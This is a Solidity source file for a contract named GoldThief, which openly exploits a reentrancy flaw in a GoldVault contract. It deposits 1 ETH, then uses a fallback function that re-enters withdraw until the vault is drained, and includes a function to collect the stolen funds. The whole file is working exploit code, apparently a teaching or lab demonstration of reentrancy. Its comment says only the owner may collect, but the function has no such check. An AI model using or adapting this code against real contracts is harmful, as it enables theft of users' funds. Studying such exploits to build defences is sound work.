// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IGoldVault {
    function deposit() external payable;
    function withdraw() external;
    function getContractBalance() external view returns (uint256);
}

/**
  This contract is designed to exploit the reentrancy vulnerability
  in the GoldVault contract.
 */
contract GoldThief {
    IGoldVault public vault;
    uint256 public attackCount = 0;

    constructor(address _vaultAddress) {
        vault = IGoldVault(_vaultAddress);
    }

    /**
     * @dev The entry point for the attack.
     * The thief deposits 1 ETH and then calls withdraw.
     */
    function attack() external payable {
        require(msg.value == 1 ether, "Attack requires 1 ETH");
        
        // Step 1: Deposit 1 ETH into the vault to have a balance.
        vault.deposit{value: 1 ether}();
        
        // Step 2: Trigger the withdrawal, which will start the reentrancy loop.
        vault.withdraw();
    }

    /**
     This is the malicious fallback function that gets triggered
      when GoldVault sends ETH to this contract. It re-enters the vault's
      withdraw function as long as the vault still has funds.
     */
    receive() external payable {
        attackCount++;
        // As long as the vault has more than 1 ETH, keep draining it.
        if (vault.getContractBalance() >= 1 ether) {
            vault.withdraw();
        }
    }

    /**
     Allows the owner to withdraw the stolen funds.
     */
    function collectStolenFunds() external {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Failed to send Ether");
    }
}